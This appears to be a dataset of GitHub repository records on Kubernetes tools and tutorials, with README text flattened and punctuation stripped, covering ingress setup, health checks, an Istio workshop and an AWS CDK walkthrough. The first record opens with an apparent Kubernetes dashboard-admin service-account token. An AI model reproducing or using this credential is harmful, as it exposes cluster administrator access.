eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJkYXNoYm9hcmQtYWRtaW4tdG9rZW4tOTc2NTYiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGFzaGJvYXJkLWFkbWluIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiN2ZjNzE3YzctYjk5MS00NjFiLWE5MGUtNTkyYjQ0Njc3MzM4Iiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmUtc3lzdGVtOmRhc2hib2FyZC1hZG1pbiJ9 PgNaPBkI28hv2jmFF5z5DKSI2Rl0PNHxAQn9 t 033Lr7aIW7NL8QE1Nj4fAJ692VY85bEFiHXAsStyxusMeN6LvJTRGbcZaWZN0YbqX5Q6n22VE0goadGStfVmuSGkB fyDe5WACTFJPN9EdXbgXtkD4Ny5CX4Kzv3S9iigs58UBRhwkBs2BVuE5PT361KK82HP6yvS YYGRqTHEvRyk4AQ2L4Dh7NSYH8pFba n5nT4K8wOlbqdkdQN62S5KkabYOEzHBX8WoHTERr36YxhpMvhk3o0iWgkGiOaxEfjwamtz5SDb3NQvRGqNXwNsTRh48Xw8hDfYRf7s6d g Dashboard UI Token Token Ingress HAProxy Ingress Controller bash kubectl get pod n haproxy controller o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES haproxy ingress jtldj 1 1 Running 0 10m 10 0 1 203 k8s node1 ingress default backend c675c85f 6k974 1 1 Running 0 30m 10 244 2 6 k8s node1 k8s node1 ingress yes Ingress Controller Nginx Deployment Service bash kubectl create deploy nginx web image nginx deployment apps nginx web created kubectl expose deploy nginx web target port 80 port 80 service nginx web exposed Ingress Ingress Controller Ingress bash cat web ingress yml apiVersion networking k8s io v1 kind Ingress metadata name test ingress annotations nginx ingress kubernetes io rewrite target spec rules host www zze cn http paths path pathType Prefix backend service name nginx web port number 80 hosts www zze cn Ingress Controller bash curl I www zze cn HTTP 1 1 200 OK server nginx 1 19 3 date Wed 28 Oct 2020 07 58 13 GMT content type text html content length 612 last modified Tue 29 Sep 2020 14 12 31 GMT etag 5f7340cf 264 accept ranges bytes OKIngress Controller,2020-10-26T01:38:24Z,2020-12-21T01:09:56Z,Shell,User,2,5,0,61,master,zze326,1,2,2,0,0,0,0
gritzkoo,nodejs-health-checker,hacktoberfest#hacktoberfest2020#health-check#healthcheck#k8s#liveness-probe#node-typescript#nodejs#nodemodule#npm-package#readiness-probe#typescript,nodejs health checker npm https img shields io npm dt nodejs health checker style for the badge npm version https badge fury io js nodejs health checker svg https badge fury io js nodejs health checker test https github com gritzkoo nodejs health checker workflows test badge svg branch master GitHub Workflow Status event https img shields io github workflow status gritzkoo nodejs health checker test Coverage Status https coveralls io repos github gritzkoo nodejs health checker badge svg branch master https coveralls io github gritzkoo nodejs health checker branch master License Status https img shields io github license gritzkoo nodejs health checker https img shields io github license gritzkoo nodejs health checker Issues Status https img shields io github issues gritzkoo nodejs health checker https img shields io github issues gritzkoo nodejs health checker Tag Status https img shields io github v tag gritzkoo nodejs health checker https img shields io github v tag gritzkoo nodejs health checker Languages Status https img shields io github languages count gritzkoo nodejs health checker https img shields io github languages count gritzkoo nodejs health checker Repo Size Status https img shields io github repo size gritzkoo nodejs health checker https img shields io github repo size gritzkoo nodejs health checker This is a Node package that allows you to track the health of your application providing two ways of checking Simple will respond to a JSON as below and that allows you to check if your application is online and responding without checking any kind of integration json status fully functional Detailed will respond a JSON as below and that allows you to check if your application is up and running and check if all of your integrations informed in the configuration list is up and running json name My node application version my version status true date 2020 09 18T15 29 41 616Z duration 0 523 integrations name redis integration kind Redis DB integration status true responsetime 0 044 url redis 6379 name My memcache integration kind Memcached integraton status true responsetime 0 038 url memcache 11211 name my web api integration kind Web integrated API status true responsetime 0 511 url https github com status name my dynamo kind AWS Dynamo DB status true responsetime 0 004 url http localhost 8000 How to install sh npm i nodejs health checker Available integrations x Redis x Memcached x Web integration https x AWS DynamoDB How to use Example using Nodejs Express javascript import express from express import HealthcheckerDetailedCheck HealthcheckerSimpleCheck from healthchecker healthchecker import HealthTypes from interfaces types const server express server get health check liveness res res send HealthcheckerSimpleCheck server get health check readiness async res res send await HealthcheckerDetailedCheck name My node application version my version here you will inform all of your external dependencies that your application must be checked to keep healthy available integration types HealthTypes Redis HealthTypes Memcached HealthTypes Web integrations type HealthTypes Redis name redis integration host redis type HealthTypes Memcached name My memcache integration host memcache 11211 type HealthTypes Web name my web api integration host https github com status headers key Accept value application json type HealthTypes Dynamo name my dynamo host http localhost port 8000 Aws region us east 1 accesskeyid secretaccesskey export default server And then you could call these endpoints manually to see your application health but if you are using modern Kubernetes deployment you can config your chart to check your application with the setup below yaml apiVersion v1 kind Pod metadata labels test liveness name liveness http spec containers name liveness image node your application image args server livenessProbe httpGet path health check liveness port 80 httpHeaders name Custom Header value Awesome initialDelaySeconds 3 periodSeconds 3 name readiness image node your application image args server readinessProbe httpGet path health check readiness port 80 httpHeaders name Custom Header value Awesome initialDelaySeconds 3 periodSeconds 3,2020-09-16T10:10:50Z,2020-12-22T01:18:03Z,TypeScript,User,4,5,3,13,master,gritzkoo#danilolutz#joaomantovani#dependabot[bot],4,3,9,1,1,1,12
devYun,luozhiyun-SourceLearn,,https www luozhiyun com start k8skubernates k8sk8s Docker E6 B7 B1 E5 85 A5k8s Docker md 1 k8sk8s E6 B7 B1 E5 85 A5k8s 1 E6 B7 B1 E5 85 A5k8s EF BC 9A E5 9C A8k8s E4 B8 AD E8 BF 90 E8 A1 8C E7 AC AC E4 B8 80 E4 B8 AA E7 A8 8B E5 BA 8F md 2 k8sPod E6 B7 B1 E5 85 A5k8s 2 E6 B7 B1 E5 85 A5k8s EF BC 9APod E5 AF B9 E8 B1 A1 E4 B8 AD E9 87 8D E8 A6 81 E6 A6 82 E5 BF B5 E5 8F 8A E7 94 A8 E6 B3 95 md 3 k8sDeployment E6 B7 B1 E5 85 A5k8s 3 E6 B7 B1 E5 85 A5k8s EF BC 9ADeployment E6 8E A7 E5 88 B6 E5 99 A8 md 4 k8sPVPVC E6 B7 B1 E5 85 A5k8s 4 E6 B7 B1 E5 85 A5k8s EF BC 9A E6 8C 81 E4 B9 85 E5 8D B7PV E3 80 81PVC E5 8F 8A E5 85 B6 E6 BA 90 E7 A0 81 E5 88 86 E6 9E 90 md 5 k8sStatefulSet E6 B7 B1 E5 85 A5k8s 5 E6 B7 B1 E5 85 A5k8s EF BC 9AStatefulSet E6 8E A7 E5 88 B6 E5 99 A8 E5 8F 8A E5 85 B6 E6 BA 90 E7 A0 81 E5 88 86 E6 9E 90 md 6 k8sDaemonSet E6 B7 B1 E5 85 A5k8s 6 E6 B7 B1 E5 85 A5k8s EF BC 9A E5 AE 88 E6 8A A4 E8 BF 9B E7 A8 8BDaemonSet E5 8F 8A E5 85 B6 E6 BA 90 E7 A0 81 E5 88 86 E6 9E 90 md 7 k8sJobCronJob E6 B7 B1 E5 85 A5k8s 7 E6 B7 B1 E5 85 A5k8s EF BC 9A E4 BB BB E5 8A A1 E8 B0 83 E7 94 A8Job E4 B8 8ECronJob E5 8F 8A E6 BA 90 E7 A0 81 E5 88 86 E6 9E 90 md 8 k8sQoseviction E6 B7 B1 E5 85 A5k8s 8 E6 B7 B1 E5 85 A5k8s EF BC 9A E8 B5 84 E6 BA 90 E6 8E A7 E5 88 B6Qos E5 92 8Ceviction E5 8F 8A E5 85 B6 E6 BA 90 E7 A0 81 E5 88 86 E6 9E 90 md 9 k8s E6 B7 B1 E5 85 A5k8s 9 E6 B7 B1 E5 85 A5k8s EF BC 9A E8 B0 83 E5 BA A6 E5 99 A8 E5 8F 8A E5 85 B6 E6 BA 90 E7 A0 81 E5 88 86 E6 9E 90 md 10 k8s E6 B7 B1 E5 85 A5k8s 10 k8s md 11 k8skubelet E6 B7 B1 E5 85 A5k8s 11 k8skubelet md 12 k8skubeletpod E6 B7 B1 E5 85 A5k8s 12 k8skubeletpod md 13 k8sPodHPA E6 B7 B1 E5 85 A5k8s 13 k8sPodHPA md 14 k8skube proxyipvs E6 B7 B1 E5 85 A5k8s 14 k8skube proxyipvs md 15 k8sEvent E6 B7 B1 E5 85 A5k8s 15 k8sEvent md 16 k8sInformer k8s 16 k8sInformer md,2020-09-12T02:50:30Z,2020-11-08T07:55:44Z,n/a,User,1,5,1,14,master,a413650185#devYun,2,0,0,0,0,0,0
eitrtechnologies,pre-commit-bannedk8skinds,cybersecurity#git-hook#git-hooks#k8s#kubernetes#pre-commit#pre-commit-hook#pre-commit-hooks#secrets#security-tools#yaml,pre commit bannedk8skinds pre commit hook to deny commits of certain Kubernetes object types See also Using pre commit bannedk8skinds with pre commit Add this to your pre commit config yaml yaml repo https github com eitrtechnologies pre commit bannedk8skinds rev v1 0 0 Use the ref you want to point to hooks id bannedk8skinds Hooks Available bannedk8skinds Deny commits of certain Kubernetes object types Defaults to Secret allow multiple documents allow yaml files which use the multi document syntax http www yaml org spec 1 2 spec html YAML kinds Specify a comma separated list of Kubernetes object types https git k8s io community contributors devel sig architecture api conventions md types kinds which will be denied in a commit to the repo,2020-11-10T00:58:02Z,2020-12-04T09:01:18Z,Python,Organization,3,5,0,3,main,nicholasmhughes,1,1,1,0,0,0,0
TIKI-Institut,hdfs-k8s-topology-plugin,client-pod#data-locality#datanodes#hdfs-plugin#k8s#k8s-nodes#namenode,Build Status https travis ci org TIKI Institut hdfs k8s topology plugin svg branch master hdfs k8s topology plugin About The assumption of Data Locality is that it is more efficient to move the computation rather than to move the data The Hadoop Distributed Filesystem HDFS runs a lot of Locality Optimizing code by default to increase performance and reduce network traffic Unfortunatly the native Hadoop Data Locality Implementation is not compatible with Kubernetes This repository provides a K8s HDFS Data Locality implementation which fixes this issue regardless of the network plugin used by Kubernetes The Plugin diagram png This diagram demonstrates the K8s HDFS Data Locality Routine splitted up in two steps Step 1 When Datanode Pods are created in the Kubernetes Cluster they register themself at the Namenode on which they are assigned to Together with other registration details the Datanodes are transmitting a Full Qualified Domain Name FQDN such as kubernetes worker 6 ds example local The Namenode then uses these FQDNs to build a Networkpath of the form rack host PodIP for each Datanode Step 2 The same procedure is applied whenever a client sends a request to Namenode Based on the client IP the Namenode constructs a Networkpath in the same form as in case of Datanode Registry After that Namenode is now able to match clients and Datanodes on the same K8s Nodes In terms of the example shown in the diagram this would mean that the client uses File A from Datanode 2 instead of same file from Datanode 3 The Algorithm Datanodes In case of Datanodes the main method of the Plugin receives a FQDN per Datanode Because FQDNs are always constructed in such form that K8s Nodename is at the beginning and sepreated with a point from other content Namenode simply splits each FQDN at the first point Clients In case of clients the main methods of the Plugin receives the IP of the Client Pod The Namenode uses a KubernetesClient to ask the KubeAPI Server which Nodename corresponds to the given IP After that the Namenode looks for any Datanode with required data on the same K8s Node as the client and finally returns a sorted list of Datanodes to the client The Client then connects to the first entry which represents the most local Datanode Caching Because the resolving of clients requires a KubeAPI query each resolved Nodename is cached per IP and is deleted after a fixed amount of time By default this Cache Expiry Interval is set to 5 minutes but you can change this by setting the environment variable TOPOLOGYUPDATEINMIN in Namenode Pod Build This project can be built with maven Simply run mvn clean package and use the jar for integration Integrate 1 Copy the Jar to Namenode Namenode Formatter Checkpointnode Datanodes Image in directory opt hadoop share hadoop common lib 2 Add following tags to hdfs siteconfig xml xml net topology node switch mapping impl com tiki ai hadoop net PodToNodeMapping net topology impl org apache hadoop net NetworkTopologyWithNodeGroup net topology nodegroup aware true dfs block replicator classname org apache hadoop hdfs server blockmanagement BlockPlacementPolicyWithNodeGroup 3 If you wish to set a Cache Expiry Interval other than 5 minutes you can set a Namenode environment variable with name TOPOLOGYUPDATEINMIN 4 The namenode needs a K8s Serviceaccount with permission to get all pods in K8s Cluster Test 1 Create new HDFS Client Pod with DEBUG log setting 2 Connect on client Pod and run a cat or other read command on a file stored in HDFS 3 Search for following Log Message in client logs DEBUG DFSClient Connecting to datanode 4 Check if matches IP of the datanode which is located on same kubernetes node as Client Pod 5 Repeat this test several times,2020-10-12T09:13:50Z,2020-12-14T08:03:48Z,Java,Organization,6,4,0,42,master,Lxixnxuxs#wobu#tiwalter#dependabot[bot],4,1,2,0,0,0,2
gecailong,K8sMonitor,,K8sMonitor PrometheusK8s Prometheus PrometheusThanosVictoriametrics apiserver hashPrometheus https www noalert cn post ru he yong yuan sheng prometheus jian kong da gui mo kubernetes ji qun,2020-12-03T08:25:19Z,2020-12-16T06:37:07Z,Shell,User,2,4,2,5,main,gecailong,1,0,0,0,0,0,0
toboshii,k8s-gitops,,k8s gitops,2020-10-06T16:40:53Z,2020-12-18T07:40:14Z,Shell,User,1,4,1,155,main,toboshii#renovate-bot,2,0,0,2,1,1,12
ibrahimgunduz34,k8s-playground,,Kubernetes Demo Environment With Master Slave Nodes Work in progress It s a playground environment with k8s master slave nodes You can simply create vms with vagrant and provision them by the ansible playbook in the repository Prerequisities Virtualbox Vagrant Ansible System Requirements 6 GB Free memory space 8 GB Free disk space Setup Run create cluster script under the scripts folder in order to create the virtual machines and a Kubernetes cluster on them scripts create cluster The script would create 3 virtual machines with the following IP addresses 192 168 20 10 Master node 192 168 20 11 Slave Node 1 192 168 20 12 Slave Node 2 How To Access Kubernetes Run download k8s config script under scripts folder scripts download k8s config Check the nodes statuses by the following command kubectl get nodes You should see a result like the following NAME STATUS ROLES AGE VERSION k8smaster Ready master 28m v1 19 0 k8sslave1 Ready 27m v1 19 0 k8sslave2 Ready 27m v1 19 0 NOTE Keep it mind that nodes may become available Ready in several minutes TODOs Use generic group names instead of environment specific group names for the roles regarding multi node setup Learn how to access the cluster from remote and update the document Make the kubernetes works with multi slave and single master at the first phase Update the vagrant configuration to create a second vm in order to use it as slave kubernetes node Update ansible scripts to make the required changes on the vm OS and install common components to the slave too Update firewall rules for the slave node by ansible Register slave kubernetes node to the master Find a way to make the slave nodes works after VMs slept and woke up Put an example project into repo that uses external services db cache queue broker etc with kubernetes deployment configuration Deployment configuration should create multiple instance of the application container The application should start with delay The deployment configuration should take care of application instances health check The configuration should allow load balancing between the application instances and provide an endpoint that external users can access the application Make the kubernetes works with multi master and slave nodes Put some automated tests to simulate and test downtime scenarios of master or slave nodes Troubleshooting Problem If master works and slave nodes looks NotReady Solution Check if all machine date time configurations are identical Run the following command to see the date configuration of all servers scripts display servers date You should see a result like the following Server Master Thu Sep 10 20 14 36 03 2020 Server Slave 1 Thu Sep 10 20 14 36 03 2020 Server Slave 2 Thu Sep 10 17 14 37 UTC 2020 if you see any time difference bigger than a few seconds first reboot the machines vagrant reload Check the status of the nodes by kubectl get nodes command kubectl get nodes if you still don t see the following result in a few minutes continue by the next steps below NAME STATUS ROLES AGE VERSION k8smaster Ready master 13m v1 19 0 k8sslave1 Ready 12m v1 19 0 k8sslave2 Ready 12m v1 19 0 Re initialize the cluster by reinitialize cluster script under scripts folder IMPORTANT This step will reset whole cluster You may lose your data scripts reinitialize cluster Re download the latest kubernetes configuration after re initialized the kubernetes cluster scripts download k8s config Credits Some docs for kubernetes installation https www tecmint com install a kubernetes cluster on centos 8 https www tecmint com install a kubernetes cluster on centos 8 https phoenixnap com kb how to install kubernetes on centos https phoenixnap com kb how to install kubernetes on centos Solution for tc command missing issue https stackoverflow com questions 59653331 kubernetes centos 8 tc command missing impact https stackoverflow com questions 59653331 kubernetes centos 8 tc command missing impact Solution for misconfiguration kubelet cgroup driver systemd is different from docker cgroup driver cgroupfs issue https kubernetes io docs setup production environment tools kubeadm troubleshooting kubeadm https kubernetes io docs setup production environment tools kubeadm troubleshooting kubeadm Solution to print join token after initialized master node https stackoverflow com questions 40009831 cant find kubeadm token after initializing master https stackoverflow com questions 40009831 cant find kubeadm token after initializing master Solution for unable to update cni config No networks found in etc cni net d issue https stackoverflow com questions 43713509 kubernetes v1 6 2 unable to update cni config no networks found in etc cni net https stackoverflow com questions 43713509 kubernetes v1 6 2 unable to update cni config no networks found in etc cni net,2020-08-28T07:51:05Z,2020-09-10T17:26:41Z,Shell,User,2,4,0,0,master,,0,0,0,0,0,0,0
emilybache,K8sAudit-Kata,,Kubernetes Audit Kata Imagine you work for a wildly successful company which has many products in the healthcare sector Each product runs in its own Kubernetes cluster Because of the regulatory demands in the healthcare sector it s important that there is an audit trail showing what is deployed and running at any given time You are developing a new Audit microservice It should record what is happening in a kubernetes cluster for auditing purposes This exercise describes the first increment of functionality to be delivered and provides some sample data you can use When you start the Audit service you configure it with the hostname for the kubernetes server the name of the cluster this service should monitor the relevant namespace within that cluster Every minute the service should query the Kubernetes API to find out a list of all the available resources For each resource that meets certain criteria detailed below query the API again to find out details about that resource Write a file for each resource containing these details When all the resource details have been fetched create an archive containing all the files and name it after the date and time This file should be written to a particular location and permissions set to read only There will be a new file each minute Of all the resources Kubernetes knows about the only ones we want to save for audit purposes have the properties namespaced true and a verb called list Note in the sample data given only the configmaps resource meets those criteria Details Assume a kubernetes hostname sample k8s hostname and cluster name samplecluster and namespace samplenamespace This will fetch a list of all resources GET https sample k8s hostname k8s clusters samplecluster api v1 timeout 32s The response is formatted as json and an example is found in the file sampleresourcelist json sampledata sampleresourcelist json That json contains information about resources To then fetch further information about a particular resource for example configmaps need to make a request like this GET https sample k8s hostname k8s clusters samplecluster apis extensions v1beta1 namespaces samplenamespace configmaps limit 500 That request also needs to have the Accept header set like this Accept application json The Audit service doesn t need to parse this json only store it in a file named after the resource For the example data given this is one file configmaps json The archive of all the resource json files should be a tar gz file written to the relevant cluster folder and named after the datetime in ISO format for example audit sample k8s hostname samplecluster samplenamespace 2020 10 31T071055 audit tar gz Error handling Whatever errors occur when requesting information from k8s the audit service should always write an archive file every minute even if it is empty It should also write a log file with information about any errors encountered For example audit sample k8s hostname samplecluster samplenamespace 2020 10 31T071055 audit log,2020-10-15T08:23:49Z,2020-12-03T07:49:36Z,n/a,User,1,4,0,1,main,emilybache,1,0,0,0,0,0,0
ludusrusso,virtualrobot-k8s-operator,,,2020-12-13T21:44:38Z,2020-12-16T15:11:25Z,Go,User,1,4,0,0,main,,0,0,0,0,1,0,0
erichegt,workshop-k8s-helm-istio,,Node devops course Istio Chapter Setup inicial Minikube Instale o Minikube no Mac sh brew install minikube Instala o Linux https minikube sigs k8s io docs start Para listar os contextos em que seu kubectl est conectado faa um sh kubectl config get contexts Se necessrio mude o contexto para o Minikube sh kubectl config use context minikube Istio Baixe e descompacte o Istio 1 6 5 precisa ser at essa vers o pois a partir do release 1 7 0 o profile demo n o vem mais com kiali e outras ferramentas apresentadas nesse workshop que pode ser encontrado na url https istio io latest news releases 1 6 x announcing 1 6 5 a partir da vers o 1 7 0 o kiali e outros add ons precisam ser instalados separadamente Instale o Istio na vers o do profile demo segundo a doc https istio io latest docs setup getting started Abaixo o tutorial resumido Resumindo o link acima depois de baixar o Istio 1 6 5 e descompact lo sh cd istio 1 6 5 export PATH PWD bin PATH istioctl install set profile demo Obs No Linux uma alternativa bem interessante ao uso do Minikube o Microk8s https microk8s io Entretando alguns dos add ons utilizados nesse workshop precisar o ser instalados manualmente tambm Espero poder atualizar esse material explicando como fazer esse setup em algum momento Helm Instale o Helm no Mac sh brew install helm Instala o Linux https helm sh docs intro install Namespace a ser usado nesse workshop Crie o namespace istio dev que vamos precisar nos exemplos Na pasta de nosso projeto execute sh kubectl apply f temp istio namespace json Hands on Se familiarizando com o worflow de trabalho desse workshop Cria o altera o das aplicaes no cluster via helm Para verificar o que o Helm vai aplicar no cluster sh utils sh install yaml Observe que foi criado o arquivo helm generated yaml com o contedo a ser aplicado no cluster pelo Helm Para realmente instalar nossas aplicaes no cluster sh utils sh install Voc pode alterar os yamls de template do Helm e aplicar as mudanas usando esse passo Fazendo port forward e chamando cadeia de servios Faa o port forward do ingress para que possamos fazer uma chamada a entrada de nossa aplica o sh utils sh pfIngress Em outra abas faa uns requests para nossa cadeia de servios ser necessrio instalar em seu SO o watch e o jsonpp caso j n o possua sh utils sh callChain Para fazer uma nica chamada aplica o use sh utils sh callChain single Deixe essas abas rodando as chamadas ao cluster para que possamos ver como a aplica o est respondendo Acessando o Kiali e Jager para melhor entendimento do que est ocorrendo no cluster Em outra aba verifique como o Kiali identificou a topologia de nossos servios user e senha admin sh utils sh kiali Em outra aba veja os tracings no Jaeger sh utils sh jaeger Mantenha o Kiali e o Jaeger rodando para que as consequncias das alteraes no cluster possam ficar visveis Emulando uma instabilidade Vamos introduzir latncia na aplica o para verificar o comportamento dela Escolha uma das aplicaes nmero de 1 a 5 para adicionar o endpoint de aumento de latncia No exemplo abaixo vamos escolher a inst ncia 3 para fazer o port forward sh utils sh pf 3 Obs esse port forward para o Service e n o do Pod mas como s temos uma inst ncia no deployment desse recurso teremos um comportament consistente Caso fossem 2 inst ncias seria introduzido delay em apenas uma delas Agora podemos chamar o endpoint de introdu o de latncia sh utils sh callDelay Observe no navegador o Jaeger e procure pelo tracing das chamadas recentes feitas ao callChain que ainda deve estar rodando em uma aba do terminal Vamos voltar para a situa o instvel e vamos fazer o revert do comportament de delay para introduzir um novo conceito no prximo step Por agora faa uma nova chamada ao endpoint anterior sh utils sh callDelay Observe pelo Jaeger ou Kiali que o sistema voltou a ficar estvel Deixe os terminais preparados para refazermos esse processo mas antes aba uma nova aba para fazermos uma nova config no passo seguinte Ligando o circuit breaker do Istio Proxy Sidecar Vamos fazer uma mudana na estrutura de nosso chart do helm antes de aplic la vamos ver o atual estado de nossos charts Repare na revision da sada do comando abaixo sh helm n istio dev list Para ativar a configura o de circuit breaker nos Pods do cluster ligue a flag da seguinte varivel de ambiente sh export ISTIOCIRCUITBREAKERON 1 Vamos agora habilitar essa config fazendo nesse terminal o comando sh utils sh install Caso esteja curioso com o que foi aplicado execute o comando abaixo e observe no arquivo healm generated yaml nos recursos de DestinationRule principalmente sh utils sh install yaml Vamos repetir o processo de introduzir latncia Supondo que ainda existe um terminal rodandno com o utils sh pf 3 onde 3 um nmero de 1 a 5 de um dos servios da cadeia de chamadas Novamente faa a chamada sh utils sh callDelay Repare o comportamento agora Depois de algumas tentativas com timeout o nosso circuit breaker abre o circuito e a aplica o comea a retornar o JSON de fallback com uma chamada parcialmente completa Canary Deploy Vamos agora testar o Canary subindo em uma das aplicaes primeiro argumento 3 uma vers o para a Green segundo argumento 0 2 com um certo percentual de trfego terceiro argumento 0 Para observar o que o Helm ir fazer no cluster sh utils sh enableGreen 3 0 2 0 yaml Observe que foi criado o arquivo helm generated yaml com o contedo a ser aplicado no cluster pelo Helm Para executar a instala o sh utils sh enableGreen 3 0 2 0 Agora que a Green est preparada vamos aumentar o percentual dela para 80 sh utils sh enableGreen 3 0 2 80 Observe o Kiali o grafo da aplica o sendo alterado,2020-11-17T01:59:19Z,2020-11-18T00:00:30Z,Shell,User,1,4,1,1,master,erichegt,1,0,0,0,0,0,0
tcfw,go-grpc-k8s-resolver,go#golang#golang-package#grpc#grpc-go#kubernetes,go grpc k8s resolver GRPC resolver for Kubernetes service endpoints PkgGoDev https pkg go dev badge github com tcfw go grpc k8s resolver https pkg go dev github com tcfw go grpc k8s resolver Go Report Card https goreportcard com badge github com tcfw go grpc k8s resolver https goreportcard com report github com tcfw go grpc k8s resolver Overview Based off the DNS resolver rather than making DNS queries the k8s resolver queries the Kubernetes API for service endpoints matching the service name Using a headless service can be slow to update and the reverse proxies in service meshes may increase latency By using the endpoints Kubernetes updating the client with new or removing old server endpoints can be much faster overview overview png Example go package main import log pb github com your username your project protos github com tcfw go grpc k8s resolver func main resolver dns if os Getenv KUBERNETESSERVICEHOST resolver k8s resolver SetDefaultScheme resolver conn err grpc Dial my service name if err nil panic err defer conn Close client pb NewRouteGuideClient conn feature err client GetFeature context Background pb Point409146138 746188906 if err nil panic err log Println feature,2020-09-28T12:00:48Z,2020-12-09T07:51:53Z,Go,User,1,4,0,1,master,tcfw,1,0,0,0,0,0,0
aws-samples,aws-cdk-k8s-dotnet-todo,,Build and Deploy Net Core WebAPI Container to Amazon EKS using CDK cdk8s In this blog we will leverage the development capabilities of CDK for Kubernetes https cdk8s io also known as cdk8s along with defining cloud infrastructure as code using AWS Cloud Development Kit AWS CDK https docs aws amazon com cdk latest guide home html which provisions it through AWS CloudFormation cdk8s allows us to define Kubernetes apps and components using familiar languages cdk8s is an open source software development framework for defining Kubernetes applications and reusable abstractions using familiar programming languages and rich object oriented APIs cdk8s apps synthesize into standard Kubernetes manifests which can be applied to any Kubernetes cluster cdk8s lets you define applications using Typescript JavaScript and Python In this blog we will use Python The AWS CDK is an open source software development framework to model and provision your cloud application resources using familiar programming languages including TypeScript JavaScript Python C and Java For the solution in this blog we will use C for the infrastructure code Lets get started At a high level we will go through the following 1 Create a simple TODO Microsoft NET Core Web API application and integrate with Amazon Aurora Serverless database AWS SDK Package like SSM into it 2 Use AWS CDK to define the Infrastructure resources required for the application 3 Use cdk8s to define deploy and run the application within the created Kubernetes cluster Created above by CDK 4 Use Elastic Kubernetes Service https aws amazon com eks Elastic Container Registry ECR https aws amazon com ecr Amazon Systems Manager SSM https aws amazon com systems manager maintains the Aurora DB Credentials 5 Amazon Aurora Database Serverless https aws amazon com rds aurora is used as the backend The creation of above infrastructure on your account would result in charges beyond free tier Please see below Pricing section for each individual services specific details Make sure to clean up the built infrastructure to avoid any recurring cost Alt text blog architecture png raw true Title The Github source code https github com aws samples aws cdk k8s dotnet todo includes a cdk8s folder where the NET application docker container WebAPI in ECR will be deployed and run in the Kubernetes cluster cdk folder with Microsoft NET Core based AWS Cloud Development Kit CDK solution to build the infrastructure This solution constructs the AWS infrastructure where the webapi NET Core Web api is packaged built as an artifact and pushed to AWS ECR The provided NET project leverages AWS SDK Mysql data packages to connect to MySQL and interact with Amazon Aurora database The exposed Web API endpoint performs HTTP calls GET POST to add retrieve TODOs The end user can use any http get put tool like curl or UI tools like Google Chrome ARC Rest Client or POSTMAN to validate the changes Overview of the AWS services used in this solution Amazon Aurora https aws amazon com rds aurora a MySQL and PostgreSQL compatible relational database is used as the backend for the purpose of this project Amazon Elastic Kubernetes Service https aws amazon com eks is a fully managed Kubernetes service EKS runs upstream Kubernetes and is certified Kubernetes conformant so you can leverage all benefits of open source tooling from the community You can also easily migrate any standard Kubernetes application to EKS without needing to refactor your code In this example we use cdk8s to deploy the K8s services and pods The code is provided as part of the solution Amazon Elastic Container Registry https aws amazon com ecr the AWS provided Docker container registry is used and integrated with ECS simplifying the development to production workflow Prerequisites We will use Docker Containers to deploy the Microsoft NET Web API The following are required to setup your development environment 1 Python 3 7 https www python org downloads release python 377 2 AWS CLI https docs aws amazon com cli latest userguide cliv2 migration html 3 NET Core https dotnet microsoft com download dotnet core 3 1 1 Web API application was built using Microsoft NET core 3 1 2 Please refer Microsoft Documentation for installation 4 Docker https www docker com 1 Install Docker https www docker com products docker desktop based on your OS 2 Make sure the docker daemon is running 5 Kubectl https kubernetes io docs tasks tools install kubectl 6 AWS CDK 1 58 0 https docs aws amazon com cdk latest guide gettingstarted html gettingstartedinstall 7 AWS cdk8s https github com awslabs cdk8s blob master docs getting started python md 8 Additionally we use AWS SDK MySql data packages for the Microsoft NET project and have added them as nuget packages to the solution In this example we use Mysql data to connect to MySql Aurora database and also AWS SDK Systems Manager to connect to Amazon Systems Manager Walk through of the Solution We will use the following steps to provision the infrastructure and services and deploy the application High level steps for deploying the solution 1 Download Clone the git solution 1 Code has installation and cleanup scripts In runinfra sh installation script provide your AWS account number where the solution needs to be deployed 1 Provide your account number in main py within cdk8s folder where the cdk8s Kubernetes deployment needs to be done This could be the same account number in above step 1 Run the installation scripts 1 Review and Validate the application 1 Cleanup using the cleanup scripts the solution Detailed steps are provided below 1 Clone the sample code from the GitHub https github com aws samples aws cdk k8s dotnet todo location git clone https github com aws samples aws cdk k8s dotnet todo The git source provided above has a cdk webapi and a cdk8s folder webapi has the necessary NET Web API solution We will use the AWS CDK commands to build the infrastructure and deploy the webapi into EKS cdk8s code provided using Python language defines our kubernetes chart which creates a webservice k8s Service and Deployment Once the code is downloaded please take a moment to see how CDK provides a simpler implementation for spinning up an infrastructure using C code You may use Visual Studio Code https aws amazon com visualstudiocode or your favorite choice of IDE to open the folder aws cdk k8s dotnet todo Open the file aws cdk k8s dotnet todo cdk src EksCdk EksCdkStack cs Code below provided a snippet from the github solution spins up a VPC for the required Cidr and number of availability zones Similarly Open the file aws cdk k8s dotnet todo cdk8 main py Below snippet creates a kubernetes chart and creates a webservice NOTE Make sure to replace with your AWS account number where you are trying to deploy run this application main py is called by cdk8s yaml when cdk8s synth is invoked by runcdk8s sh Windows users may have to change the name to main py instead of main py in the cdk8s yaml Open the file aws cdk k8s dotnet todo cdk8 main py Code below provided a snippet from the github solution creates a Chart and creates a webservice usr bin env python from constructs import Construct from cdk8s import App Chart from imports import k8s from webservice import WebService class MyChart Chart def init self scope Construct ns str super init scope ns define resources here WebService self todo app image dkr ecr us east 1 amazonaws com todo app latest replicas 1 Open the file aws cdk k8s dotnet todo cdk src EksCdk EksCdkStack cs Below snippet creates a kubernetes chart and creates a webservice This sample snippet creates the EKS Cluster var cluster new Cluster this Constants CLUSTERID new ClusterProps MastersRole clusterAdmin Version KubernetesVersion V116 KubectlEnabled true DefaultCapacity 0 Vpc vpc 2 Build the CDK source code and deploy the AWS CloudFormation stacks Scripts provided runinfra sh runcdks sh cleanup sh NOTE This will clean up the entire infrastructure This is needed only when we need to cleanup destroy the infrastructure created by this blog Provided runinfra sh 